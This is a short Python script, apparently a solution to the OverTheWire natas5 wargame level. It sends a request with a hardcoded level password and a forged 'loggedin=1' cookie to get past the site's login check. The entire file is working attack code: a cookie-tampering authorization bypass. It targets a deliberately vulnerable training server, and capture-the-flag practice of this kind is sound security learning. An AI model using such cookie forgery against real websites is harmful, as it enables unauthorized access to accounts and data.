import requests

target = "http://natas5.natas.labs.overthewire.org"
cookie = {"loggedin":"1"}
r = requests.get(target, auth=('natas5','iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq'),cookies=cookie)
print r.text